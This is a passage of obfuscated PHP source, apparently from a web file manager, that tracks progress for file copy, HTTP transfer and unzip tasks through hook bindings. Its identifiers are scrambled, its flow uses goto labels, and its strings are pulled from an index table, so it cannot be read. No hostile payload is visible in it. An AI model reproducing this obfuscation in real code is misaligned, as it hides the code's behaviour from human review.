Hook::bind($c¼¥Ä…¶Í„[543], array($this, $c¼¥Ä…¶Í„[1461])); Hook::bind($c¼¥Ä…¶Í„[509], array($this, $c¼¥Ä…¶Í„[1462])); Hook::bind($c¼¥Ä…¶Í„[506], array($this, $c¼¥Ä…¶Í„[1462])); goto fšäç¼„Ğº; C‚ù”çÂİ: Hook::bind($c¼¥Ä…¶Í„[1463], array($this, $c¼¥Ä…¶Í„[1464])); Hook::bind($c¼¥Ä…¶Í„[532], array($this, $c¼¥Ä…¶Í„[1465])); $this->sourceModelCopyFlag = !1; goto eä® ôÄ —; fœ·ß¹ªî„: Hook::bind($c¼¥Ä…¶Í„[539], array($this, $c¼¥Ä…¶Í„[1459])); Hook::bind($c¼¥Ä…¶Í„[540], array($this, $c¼¥Ä…¶Í„[1460])); Hook::bind($c¼¥Ä…¶Í„[542], array($this, $c¼¥Ä…¶Í„[1461])); goto Aèñ¬¼á¦Š; E±‘µğßªî: Hook::bind($c¼¥Ä…¶Í„[1453], array($this, $c¼¥Ä…¶Í„[1454])); Hook::bind($c¼¥Ä…¶Í„[1455], array($this, $c¼¥Ä…¶Í„[1456])); Hook::bind($c¼¥Ä…¶Í„[1457], array($this, $c¼¥Ä…¶Í„[1458])); goto fœ·ß¹ªî„; bá‹‰Ì‚“å: $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[971]] = $c¼¥Ä…¶Í„[33]; $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1476]] = $c¼¥Ä…¶Í„[33]; $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1477]] = 0; goto Fëã‘ƒÊ‹î; cÎêÓõÕ§‰: $c¼¥Ä…¶Í„ =& $_SERVER[Î¿—”òá]; $Eœ®ç„ƒ =& $this->task; $this->sourceCopyFolder = !1; goto E±‘µğßªî; e†÷Ú¿¹·ï: } protected function endAfter() { goto C‘÷Ï¼ä©; D‡Ò‹Äªá¯: Hook::unbind($Dõ¦™÷İº†[1466], array($this, $Dõ¦™÷İº†[1467])); Hook::unbind($Dõ¦™÷İº†[1468], array($this, $Dõ¦™÷İº†[1469])); Hook::unbind($Dõ¦™÷İº†[1470], array($this, $Dõ¦™÷İº†[1471])); goto d÷Ìòˆ›ÖŠ; C‘÷Ï¼ä©: $Dõ¦™÷İº† =& $_SERVER[Î¿—”òá]; Hook::unbind($Dõ¦™÷İº†[1453], array($this, $Dõ¦™÷İº†[1454])); Hook::unbind($Dõ¦™÷İº†[1455], array($this, $Dõ¦™÷İº†[1456])); goto B¤Â½±‘¾¡; D¿Ÿó‹ÙŞ: Hook::unbind($Dõ¦™÷İº†[515], array($this, $Dõ¦™÷İº†[1462])); Hook::unbind($Dõ¦™÷İº†[1463], array($this, $Dõ¦™÷İº†[1464])); Hook::unbind($Dõ¦™÷İº†[532], array($this, $Dõ¦™÷İº†[1465])); goto D‡Ò‹Äªá¯; bŒĞ¬£î‚Ï: Hook::unbind($Dõ¦™÷İº†[506], array($this, $Dõ¦™÷İº†[1462])); Hook::unbind($Dõ¦™÷İº†[511], array($this, $Dõ¦™÷İº†[1462])); Hook::unbind($Dõ¦™÷İº†[513], array($this, $Dõ¦™÷İº†[1462])); goto D¿Ÿó‹ÙŞ; B¤Â½±‘¾¡: Hook::unbind($Dõ¦™÷İº†[1457], array($this, $Dõ¦™÷İº†[1458])); Hook::unbind($Dõ¦™÷İº†[539], array($this, $Dõ¦™÷İº†[1459])); Hook::unbind($Dõ¦™÷İº†[540], array($this, $Dõ¦™÷İº†[1460])); goto eË­‚©ùÚŒ; eË­‚©ùÚŒ: Hook::unbind($Dõ¦™÷İº†[542], array($this, $Dõ¦™÷İº†[1461])); Hook::unbind($Dõ¦™÷İº†[543], array($this, $Dõ¦™÷İº†[1461])); Hook::unbind($Dõ¦™÷İº†[509], array($this, $Dõ¦™÷İº†[1462])); goto bŒĞ¬£î‚Ï; d÷Ìòˆ›ÖŠ: } public function copyMoveStart($E¦Î”¼Ñæ¡, $DáÔ®‘Êç, $b¥ƒÊ“ã¥É, $eÂñ±©˜š‹) { goto dƒ²²“¤œŒ; Fè”ª…Ü¹: $a¡óÕâõ³é[$C´ØÁ¸Ëç[1482]] = KodIO::transferType($E¦Î”¼Ñæ¡, $b¥ƒÊ“ã¥É); $this->update(); goto bàº£Š‘Ôğ; dƒ²²“¤œŒ: $C´ØÁ¸Ëç =& $_SERVER[Î¿—”òá]; self::log($C´ØÁ¸Ëç[1481] . $DáÔ®‘Êç . $C´ØÁ¸Ëç[66] . $eÂñ±©˜š‹); $bÂ·çˆ–Åğ = rtrim(TEMP_FILES, $C´ØÁ¸Ëç[8]); goto D…Ó†¼œ“†; D…Ó†¼œ“†: if (substr($DáÔ®‘Êç, 0, strlen($bÂ·çˆ–Åğ)) == $bÂ·çˆ–Åğ) { return; } if (substr($eÂñ±©˜š‹, 0, strlen($bÂ·çˆ–Åğ)) == $bÂ·çˆ–Åğ) { return; } $a¡óÕâõ³é =& $this->task; goto Fè”ª…Ü¹; bàº£Š‘Ôğ: } public function updateAfter() { goto b¹¾­½à; b¹¾­½à: $fÏÒÄóÌ™ˆ =& $_SERVER[Î¿—”òá]; $f·ˆƒ²Ñîİ =& $this->task; if (!$f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[694]]) { return; } goto A³–åšŒí; CÌƒçˆµîí: $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1430]] = $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1479]] / $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[694]]; if ($f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1430]] > 0) { $bªù¬Ö˜—ò = timeFloat() - $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1432]] - $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1435]]; $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1436]] = $bªù¬Ö˜—ò * (1 - $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1430]]) / $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1430]]; } goto EĞêµØ²ˆí; A³–åšŒí: if ($this->sourceModelCopyFlag) { return; } if ($f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1482]] == $fÏÒÄóÌ™ˆ[1087]) { return; } if ($f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1482]] == $fÏÒÄóÌ™ˆ[1033] || $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1482]] == $fÏÒÄóÌ™ˆ[103]) { if ($f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1476]]) { $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1479]] = $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1478]] + $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1475]]; } } else { if ($f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1482]] == $fÏÒÄóÌ™ˆ[1088]) { if ($f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1476]] == $fÏÒÄóÌ™ˆ[1033]) { $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1479]] = $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1478]] + $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1475]] * 0.5; } else { if ($f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1476]] == $fÏÒÄóÌ™ˆ[103]) { $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1479]] = $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1478]] + $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1474]] * 0.5 + $f·ˆƒ²Ñîİ[$fÏÒÄóÌ™ˆ[1475]] * 0.5; } } } } goto CÌƒçˆµîí; EĞêµØ²ˆí: } public function addPath($a˜–äÖí¡œ) { goto Cğâ¾÷; Dİò—’Ä¤å: $aØŞÓÙ‘ä = IO::infoWithChildren($a˜–äÖí¡œ); $A»èÔ ›ò™ = $f±®ŠÎö[$eŞ“‰‰Ìó[1483]] ? $f±®ŠÎö[$eŞ“‰‰Ìó[1483]][$eŞ“‰‰Ìó[1484]] : 0; $f±®ŠÎö[$eŞ“‰‰Ìó[1483]] = array($eŞ“‰‰Ìó[1484] => $A»èÔ ›ò™ + 1, $eŞ“‰‰Ìó[386] => $aØŞÓÙ‘ä[$eŞ“‰‰Ìó[28]], $eŞ“‰‰Ìó[75] => $aØŞÓÙ‘ä[$eŞ“‰‰Ìó[75]], $eŞ“‰‰Ìó[466] => $aØŞÓÙ‘ä[$eŞ“‰‰Ìó[466]] ? $aØŞÓÙ‘ä[$eŞ“‰‰Ìó[466]] : $aØŞÓÙ‘ä[$eŞ“‰‰Ìó[75]]); goto fÜÃ½å—Ş±; Cğâ¾÷: $eŞ“‰‰Ìó =& $_SERVER[Î¿—”òá]; if (!$a˜–äÖí¡œ) { return; } $f±®ŠÎö =& $this->task; goto Dİò—’Ä¤å; fÜÃ½å—Ş±: if ($aØŞÓÙ‘ä[$eŞ“‰‰Ìó[29]] == $eŞ“‰‰Ìó[167]) { $f±®ŠÎö[$eŞ“‰‰Ìó[969]] += 1; } else { $f±®ŠÎö[$eŞ“‰‰Ìó[969]] += $aØŞÓÙ‘ä[$eŞ“‰‰Ìó[80]][$eŞ“‰‰Ìó[78]]; if ($aØŞÓÙ‘ä[$eŞ“‰‰Ìó[369]]) { $f±®ŠÎö[$eŞ“‰‰Ìó[969]] += $aØŞÓÙ‘ä[$eŞ“‰‰Ìó[80]][$eŞ“‰‰Ìó[79]] + 1; } } $f±®ŠÎö[$eŞ“‰‰Ìó[694]] += $aØŞÓÙ‘ä[$eŞ“‰‰Ìó[77]]; $this->update(); goto d¸ñ›ÄÃ¬ó; d¸ñ›ÄÃ¬ó: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Fğàœ˜Âæ„) { $Bé¡±„§Â­ =& $_SERVER[Î¿—”òá]; $b¨ŒÃß =& $this->task; $b¨ŒÃß[$Bé¡±„§Â­[1472]] = $Fğàœ˜Âæ„[$Bé¡±„§Â­[28]]; $b¨ŒÃß[$Bé¡±„§Â­[971]] = $Fğàœ˜Âæ„[$Bé¡±„§Â­[28]]; $this->update(); } public function copyFileStart($D“‡‚²‡Ş‚, $bÈ‹§ñ¶Ö¥, $eÕ‡İ‘çÍË, $bÉà¢…£ïù, $AËÊœ×‹¡¥, $dÏ¨Îµ) { goto C…¾æ°ö–Ø; Bº¢ÓšøÚÊ: $this->update(); goto c÷âÈ©”; dµ¤Ä‰Ùè‹: $FĞùªÕÑ…¤[$cÄê—Ì©Ùå[971]] = $cÄê—Ì©Ùå[33]; $FĞùªÕÑ…¤[$cÄê—Ì©Ùå[1476]] = $cÄê—Ì©Ùå[33]; $FĞùªÕÑ…¤[$cÄê—Ì©Ùå[1477]] = 0; goto Bº¢ÓšøÚÊ; C…¾æ°ö–Ø: $cÄê—Ì©Ùå =& $_SERVER[Î¿—”òá]; $F†ŞŸñƒÜÅ = $AËÊœ×‹¡¥; if ($F†ŞŸñƒÜÅ == $GLOBALS[$cÄê—Ì©Ùå[1485]]) { $F†ŞŸñƒÜÅ = $GLOBALS[$cÄê—Ì©Ùå[1486]]; } goto AÄ³©ˆÜ‚Õ; AÛ·Ç´ëØİ: $FĞùªÕÑ…¤[$cÄê—Ì©Ùå[1472]] = $F†ŞŸñƒÜÅ; $FĞùªÕÑ…¤[$cÄê—Ì©Ùå[1474]] = (int) $D“‡‚²‡Ş‚->size($bÈ‹§ñ¶Ö¥); $FĞùªÕÑ…¤[$cÄê—Ì©Ùå[1475]] = 0; goto dµ¤Ä‰Ùè‹; AÄ³©ˆÜ‚Õ: $GLOBALS[$cÄê—Ì©Ùå[1486]] = $AËÊœ×‹¡¥; $GLOBALS[$cÄê—Ì©Ùå[1485]] = $dÏ¨Îµ; $FĞùªÕÑ…¤ =& $this->task; goto AÛ·Ç´ëØİ; c÷âÈ©”: } public function copyFileEnd($cğÄÕ Å¯‡, $aŞ«å”“ƒ, $A‹…›²Ò„ª, $Då±‡×Íƒí, $f¦Ğ”•§, $FìÉ›À®Øù) { $cºõ‚íµ³² =& $_SERVER[Î¿—”òá]; $e¹èÎö¹ò =& $this->task; $e¹èÎö¹ò[$cºõ‚íµ³²[1475]] = $e¹èÎö¹ò[$cºõ‚íµ³²[1474]]; $e¹èÎö¹ò[$cºõ‚íµ³²[1476]] = $cºõ‚íµ³²[33]; if ($f¦Ğ”•§ == $e¹èÎö¹ò[$cºõ‚íµ³²[1472]]) { $e¹èÎö¹ò[$cºõ‚íµ³²[1478]] += $e¹èÎö¹ò[$cºõ‚íµ³²[1474]]; $e¹èÎö¹ò[$cºõ‚íµ³²[1479]] = $e¹èÎö¹ò[$cºõ‚íµ³²[1478]]; $this->update(1); } else { $this->update(); $e¹èÎö¹ò[$cºõ‚íµ³²[1475]] = 0; } self::log($cºõ‚íµ³²[1487] . $aŞ«å”“ƒ . $cºõ‚íµ³²[66] . $Då±‡×Íƒí . $cºõ‚íµ³²[217] . $f¦Ğ”•§ . $cºõ‚íµ³²[1488] . $e¹èÎö¹ò[$cºõ‚íµ³²[1472]]); } public function updateFileEnd($c´ã±õ®Ğ¨, $f§ô¶İê¶Û) { goto b¥¿™·Á; Fãã»¢ÛÀÃ: $this->update(1); self::log($CÆåîã‚Ô¦[1489] . $c´ã±õ®Ğ¨); goto d«ò‘³¯Ùè; b¥¿™·Á: $CÆåîã‚Ô¦ =& $_SERVER[Î¿—”òá]; $cïì¸º’™î =& $this->task; $cïì¸º’™î[$CÆåîã‚Ô¦[1472]] = $c´ã±õ®Ğ¨; goto Cº÷Î™ª£ƒ; Cº÷Î™ª£ƒ: $cïì¸º’™î[$CÆåîã‚Ô¦[1474]] = $f§ô¶İê¶Û; $cïì¸º’™î[$CÆåîã‚Ô¦[1478]] += $f§ô¶İê¶Û; $cïì¸º’™î[$CÆåîã‚Ô¦[1479]] = $cïì¸º’™î[$CÆåîã‚Ô¦[1478]]; goto Fãã»¢ÛÀÃ; d«ò‘³¯Ùè: } public function sourceModelCopy($cöŒª‹ÛóŒ) { goto A—«êâ¥§; Açå¡’„›: switch ($A—Ëí–ñ‰‚) { case $EÕ¯Æ·ÊÉ[507]: $a‚µœÖßÎ = 1; break; case $EÕ¯Æ·ÊÉ[510]: $D›Êñ¤«Ÿñ[$EÕ¯Æ·ÊÉ[1472]] = $bó…¢†¤¤¯[$EÕ¯Æ·ÊÉ[28]]; break; case $EÕ¯Æ·ÊÉ[512]: $a‚µœÖßÎ = intval($cöŒª‹ÛóŒ[$EÕ¯Æ·ÊÉ[363]] * 0.4); break; case $EÕ¯Æ·ÊÉ[514]: $a‚µœÖßÎ = intval($cöŒª‹ÛóŒ[$EÕ¯Æ·ÊÉ[363]] * 0.2); break; case $EÕ¯Æ·ÊÉ[516]: $a‚µœÖßÎ = intval($cöŒª‹ÛóŒ[$EÕ¯Æ·ÊÉ[363]] * 0.4); break; } $this->update($a‚µœÖßÎ); $this->sourceModelCopyFlag = !1; goto D•øŒÙï®‰; d™É›äÈİ†: $D›Êñ¤«Ÿñ =& $this->task; $this->sourceModelCopyFlag = !0; $a‚µœÖßÎ = 0; goto Açå¡’„›; A—«êâ¥§: $EÕ¯Æ·ÊÉ =& $_SERVER[Î¿—”òá]; $A—Ëí–ñ‰‚ = $cöŒª‹ÛóŒ[0]; $bó…¢†¤¤¯ = $cöŒª‹ÛóŒ[1]; goto d™É›äÈİ†; D•øŒÙï®‰: } public function sourceRemove($bòÇ¥Ò¿õ¼, $B‰‚ìÌ¹›) { $c¹Û›ì•‘ò =& $_SERVER[Î¿—”òá]; $this->sourceModelCopyFlag = !0; $Fò±¶·¢¾Õ = 1; if (isset($bòÇ¥Ò¿õ¼[$c¹Û›ì•‘ò[80]])) { $Fò±¶·¢¾Õ = $bòÇ¥Ò¿õ¼[$c¹Û›ì•‘ò[80]][$c¹Û›ì•‘ò[78]] + $bòÇ¥Ò¿õ¼[$c¹Û›ì•‘ò[80]][$c¹Û›ì•‘ò[79]] + 1; } $this->update($Fò±¶·¢¾Õ); $this->sourceModelCopyFlag = !1; } public function sourceMove($E—™ÜÆÃà‡) { $this->sourceRemove($E—™ÜÆÃà‡, !1); } public function curlProgress($Cëºè‰Şœë, $E¾©ğòÃ›, $e´ñíï¥ŸŠ, $c•™î’É—, $Fó‰ĞÒŠ™) { $AºòĞÜÃÍ =& $_SERVER[Î¿—”òá]; $Eº°í•§ñ¾ =& $this->task; if ($Fó‰ĞÒŠ™ > 0) { $Eº°í•§ñ¾[$AºòĞÜÃÍ[971]] = $AºòĞÜÃÍ[1490]; $Eº°í•§ñ¾[$AºòĞÜÃÍ[1476]] = $AºòĞÜÃÍ[103]; if ($Eº°í•§ñ¾[$AºòĞÜÃÍ[1474]] == $c•™î’É— || $c•™î’É— > 1024 * 1024) { $Eº°í•§ñ¾[$AºòĞÜÃÍ[1475]] = $Fó‰ĞÒŠ™; } if ($Eº°í•§ñ¾[$AºòĞÜÃÍ[1477]]) { $Eº°í•§ñ¾[$AºòĞÜÃÍ[1475]] = $Fó‰ĞÒŠ™ + $Eº°í•§ñ¾[$AºòĞÜÃÍ[1477]]; } } else { if ($e´ñíï¥ŸŠ > 0) { if ($Eº°í•§ñ¾[$AºòĞÜÃÍ[1474]] == $E¾©ğòÃ›) { $Eº°í•§ñ¾[$AºòĞÜÃÍ[1475]] = $e´ñíï¥ŸŠ; $Eº°í•§ñ¾[$AºòĞÜÃÍ[971]] = $AºòĞÜÃÍ[1491]; $Eº°í•§ñ¾[$AºòĞÜÃÍ[1476]] = $AºòĞÜÃÍ[1033]; } } } $this->update(); } public function curlProgressStart($Dš£Ú°Ä¡‡) { } public function curlProgressEnd($c²˜©ªÒº) { $cÇ«Â¨…˜± =& $_SERVER[Î¿—”òá]; $aõ¨±”Ñ³µ =& $this->task; $bšÉÙ™êŒ  = curl_getinfo($c²˜©ªÒº); $cÚ ·¨ï = $bšÉÙ™êŒ [$cÇ«Â¨…˜±[1492]]; if ($aõ¨±”Ñ³µ[$cÇ«Â¨…˜±[1476]] == $cÇ«Â¨…˜±[103] && $cÚ ·¨ï) { $aõ¨±”Ñ³µ[$cÇ«Â¨…˜±[1477]] += $cÚ ·¨ï; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $dŞÅîëØë¶ =& $_SERVER[Î¿—”òá]; $E­´µ×¸»ì =& $this->task; $E­´µ×¸»ì[$dŞÅîëØë¶[1493]] = 1; Hook::bind($dŞÅîëØë¶[1466], array($this, $dŞÅîëØë¶[1494])); Hook::bind($dŞÅîëØë¶[1468], array($this, $dŞÅîëØë¶[1495])); Hook::bind($dŞÅîëØë¶[1470], array($this, $dŞÅîëØë¶[1496])); } protected function endAfter() { $aÕÒÆ…†î =& $_SERVER[Î¿—”òá]; Hook::unbind($aÕÒÆ…†î[1466], array($this, $aÕÒÆ…†î[1494])); Hook::unbind($aÕÒÆ…†î[1468], array($this, $aÕÒÆ…†î[1495])); Hook::unbind($aÕÒÆ…†î[1470], array($this, $aÕÒÆ…†î[1496])); } public function progressStart($f¢¦œãøŒç) { $Bà¢ğÜßŠè =& $_SERVER[Î¿—”òá]; $Cóô¶ãŞà = curl_getinfo($f¢¦œãøŒç); self::log($Bà¢ğÜßŠè[1497] . $Cóô¶ãŞà[$Bà¢ğÜßŠè[295]]); self::valueSet($this->task[$Bà¢ğÜßŠè[367]], $this->task); } public function progressEnd($c©ÈáÇö¾ã) { $DÏº¸«Ê’“ =& $_SERVER[Î¿—”òá]; self::log($DÏº¸«Ê’“[1498] . $this->task[$DÏº¸«Ê’“[367]]); $this->end(); } public function progress($a­ÍîàÃ¿, $CÛÌ¢œ¹‘¬, $Aö…°¬Øù‘, $Cºè±öõã£, $CÅÃºÀ…˜ç) { $F¶ªùéİ =& $_SERVER[Î¿—”òá]; $fŒˆÈˆ§©ì =& $this->task; if ($CÅÃºÀ…˜ç > 0) { $fŒˆÈˆ§©ì[$F¶ªùéİ[969]] = $fŒˆÈˆ§©ì[$F¶ªùéİ[969]] == 0 ? $Cºè±öõã£ : $fŒˆÈˆ§©ì[$F¶ªùéİ[969]]; $fŒˆÈˆ§©ì[$F¶ªùéİ[983]] = $CÅÃºÀ…˜ç; } else { if ($Aö…°¬Øù‘ > 0) { $fŒˆÈˆ§©ì[$F¶ªùéİ[969]] = $fŒˆÈˆ§©ì[$F¶ªùéİ[969]] == 0 ? $CÛÌ¢œ¹‘¬ : $fŒˆÈˆ§©ì[$F¶ªùéİ[969]]; $fŒˆÈˆ§©ì[$F¶ªùéİ[983]] = $Aö…°¬Øù‘; } } $this->update(); self::log("\x70\162\157\147\162\145\163\163\110\x74\164\160\x3a\144\x6f\x77\x6e\72{$Aö…°¬Øù‘}\x2f{$CÛÌ¢œ¹‘¬}\73\x20\x75\x70\154\x6f\141\x64\72{$CÅÃºÀ…˜ç}\57{$Cºè±öõã£}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Eê’ïœô¹÷; Eê’ïœô¹÷: $F±¦ŞºÎùÒ =& $_SERVER[Î¿—”òá]; parent::startAfter(); Hook::bind($F±¦ŞºÎùÒ[1499], array($this, $F±¦ŞºÎùÒ[1500])); goto DÏÛ’à¢Ôá; B÷ÑšƒÙ¢’: if (!$aåæˆ…ŠÇÏ[$F±¦ŞºÎùÒ[1335]]) { $aåæˆ…ŠÇÏ[$F±¦ŞºÎùÒ[1335]] = LNG($F±¦ŞºÎùÒ[1503]); } goto DßÏØí’ìÔ; DÏÛ’à¢Ôá: Hook::bind($F±¦ŞºÎùÒ[1028], array($this, $F±¦ŞºÎùÒ[1501])); $aåæˆ…ŠÇÏ =& $this->task; $aåæˆ…ŠÇÏ[$F±¦ŞºÎùÒ[1502]] = $F±¦ŞºÎùÒ[1033]; goto B÷ÑšƒÙ¢’; DßÏØí’ìÔ: } protected function endAfter() { $bº»†ƒ İÛ =& $_SERVER[Î¿—”òá]; parent::endAfter(); Hook::unbind($bº»†ƒ İÛ[1499], array($this, $bº»†ƒ İÛ[1500])); Hook::unbind($bº»†ƒ İÛ[1028], array($this, $bº»†ƒ İÛ[1501])); } public function updateAfter() { $céõ¡”Áç» =& $_SERVER[Î¿—”òá]; $E»Æ¦í©ÖË =& $this->task; if (!$E»Æ¦í©ÖË[$céõ¡”Áç»[969]] || !$E»Æ¦í©ÖË[$céõ¡”Áç»[694]]) { return; } if ($E»Æ¦í©ÖË[$céõ¡”Áç»[1502]] == $céõ¡”Áç»[1033]) { $bã¾ÓÆç“Ù = 0; if ($E»Æ¦í©ÖË[$céõ¡”Áç»[1474]]) { $bã¾ÓÆç“Ù = $E»Æ¦í©ÖË[$céõ¡”Áç»[1475]] / $E»Æ¦í©ÖË[$céõ¡”Áç»[1474]]; } $E»Æ¦í©ÖË[$céõ¡”Áç»[1430]] = $bã¾ÓÆç“Ù * 0.3; } else { if ($E»Æ¦í©ÖË[$céõ¡”Áç»[1502]] == $céõ¡”Áç»[301]) { $bã¾ÓÆç“Ù = $E»Æ¦í©ÖË[$céõ¡”Áç»[983]] / $E»Æ¦í©ÖË[$céõ¡”Áç»[969]]; $E»Æ¦í©ÖË[$céõ¡”Áç»[1430]] = 0.3 + $bã¾ÓÆç“Ù * 0.4; } else { if ($E»Æ¦í©ÖË[$céõ¡”Áç»[1502]] == $céõ¡”Áç»[103]) { $B¡ÈÚ¯‚‘ = 0; if ($E»Æ¦í©ÖË[$céõ¡”Áç»[1476]] == $céõ¡”Áç»[103]) { $B¡ÈÚ¯‚‘ = $E»Æ¦í©ÖË[$céõ¡”Áç»[1475]]; } $bã¾ÓÆç“Ù = ($E»Æ¦í©ÖË[$céõ¡”Áç»[1479]] + $B¡ÈÚ¯‚‘) / $E»Æ¦í©ÖË[$céõ¡”Áç»[694]]; $E»Æ¦í©ÖË[$céõ¡”Áç»[1430]] = 0.3 + 0.4 + $bã¾ÓÆç“Ù * 0.3; } } } if ($E»Æ¦í©ÖË[$céõ¡”Áç»[1430]] > 0) { $f“·¨ä…Œ¹ = timeFloat() - $E»Æ¦í©ÖË[$céõ¡”Áç»[1432]] - $E»Æ¦í©ÖË[$céõ¡”Áç»[1435]]; $E»Æ¦í©ÖË[$céõ¡”Áç»[1436]] = $f“·¨ä…Œ¹ * (1 - $E»Æ¦í©ÖË[$céõ¡”Áç»[1430]]) / $E»Æ¦í©ÖË[$céõ¡”Áç»[1430]]; } } public function addFile($DŠœíğŠÔ«) { goto BÉíÍÛµ’ç; Cô§Æ¿Æ³Û: $DÖìŒ£Éº[$Còš·ÒÛÚ [971]] = $Còš·ÒÛÚ [1491]; $DÖìŒ£Éº[$Còš·ÒÛÚ [1476]] = $Còš·ÒÛÚ [1033]; $DÖìŒ£Éº[$Còš·ÒÛÚ [694]] = $döå´´Â‡[$Còš·ÒÛÚ [77]]; goto dÕ¹Ç²Éºî; aĞÁÃ¢ùœ: $this->update(); goto aà¤óğ†‚; B¡ ÷¹Òë: $DÖìŒ£Éº[$Còš·ÒÛÚ [1472]] = $döå´´Â‡[$Còš·ÒÛÚ [28]]; $DÖìŒ£Éº[$Còš·ÒÛÚ [1474]] = $döå´´Â‡[$Còš·ÒÛÚ [77]]; $DÖìŒ£Éº[$Còš·ÒÛÚ [1475]] = 0; goto Cô§Æ¿Æ³Û; dÕ¹Ç²Éºî: $DÖìŒ£Éº[$Còš·ÒÛÚ [969]] = 1; $B©¹È¤±‰Ğ = 0; $DÖìŒ£Éº[$Còš·ÒÛÚ [1483]] = array($Còš·ÒÛÚ [1484] => $B©¹È¤±‰Ğ + 1, $Còš·ÒÛÚ [386] => $döå´´Â‡[$Còš·ÒÛÚ [28]], $Còš·ÒÛÚ [75] => $döå´´Â‡[$Còš·ÒÛÚ [75]], $Còš·ÒÛÚ [466] => $döå´´Â‡[$Còš·ÒÛÚ [466]] ? $döå´´Â‡[$Còš·ÒÛÚ [466]] : $döå´´Â‡[$Còš·ÒÛÚ [75]]); goto aĞÁÃ¢ùœ; BÉíÍÛµ’ç: $Còš·ÒÛÚ  =& $_SERVER[Î¿—”òá]; $DÖìŒ£Éº =& $this->task; $döå´´Â‡ = IO::info($DŠœíğŠÔ«); goto B¡ ÷¹Òë; aà¤óğ†‚: } public function unzipAfter($d´ÍˆÑË×ğ) { goto AŸÁãíÍ¼¦; f‘‰¿°÷Ë®: $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[1472]] = $A¨ô¿ğÖ¹×[33]; $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[1479]] = 0; $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[694]] = $CŠİùİÅ‚[$A¨ô¿ğÖ¹×[77]]; goto dĞœëÊö£; C³Ñˆğã­¾: $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[983]] = 0; $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[1474]] = 0; $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[1475]] = 0; goto f‘‰¿°÷Ë®; A›„„«œÚõ: if ($CŠİùİÅ‚[$A¨ô¿ğÖ¹×[29]] == $A¨ô¿ğÖ¹×[167]) { $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[969]] = 1; } else { $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[969]] = $CŠİùİÅ‚[$A¨ô¿ğÖ¹×[80]][$A¨ô¿ğÖ¹×[78]]; } $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[971]] = $A¨ô¿ğÖ¹×[33]; $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[1476]] = 0; goto C³Ñˆğã­¾; aš§”¶ƒªº: $CŠİùİÅ‚ = IO::infoWithChildren($d´ÍˆÑË×ğ); $E²¬Š”¨äÑ = 0; $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[1483]] = array($A¨ô¿ğÖ¹×[1484] => $E²¬Š”¨äÑ + 1, $A¨ô¿ğÖ¹×[386] => $CŠİùİÅ‚[$A¨ô¿ğÖ¹×[28]], $A¨ô¿ğÖ¹×[75] => $CŠİùİÅ‚[$A¨ô¿ğÖ¹×[75]], $A¨ô¿ğÖ¹×[466] => $CŠİùİÅ‚[$A¨ô¿ğÖ¹×[466]] ? $CŠİùİÅ‚[$A¨ô¿ğÖ¹×[466]] : $CŠİùİÅ‚[$A¨ô¿ğÖ¹×[75]]); goto A›„„«œÚõ; AŸÁãíÍ¼¦: $A¨ô¿ğÖ¹× =& $_SERVER[Î¿—”òá]; $Aœ†ì–ŒŠ¬ =& $this->task; $Aœ†ì–ŒŠ¬[$A¨ô¿ğÖ¹×[1502]] = $A¨ô¿ğÖ¹×[103]; goto aš§”¶ƒªº; dĞœëÊö£: $this->update(); self::log($A¨ô¿ğÖ¹×[1504] . json_encode(array($Aœ†ì–ŒŠ¬, $CŠİùİÅ‚))); goto b³Ÿ®ºÏ; b³Ÿ®ºÏ: } public function nameParse($AÉœ»¼½½Ê) { goto e¬ÔÏã¼…; e¬ÔÏã¼…: $fÅ†ÅàöÊ· =& $_SERVER[Î¿—”òá]; $cÉôÁù£„ =& $this->task; if ($cÉôÁù£„[$fÅ†ÅàöÊ·[1502]] == $fÅ†ÅàöÊ·[1033]) { $cÉôÁù£„[$fÅ†ÅàöÊ·[1502]] = $fÅ†ÅàöÊ·[301]; 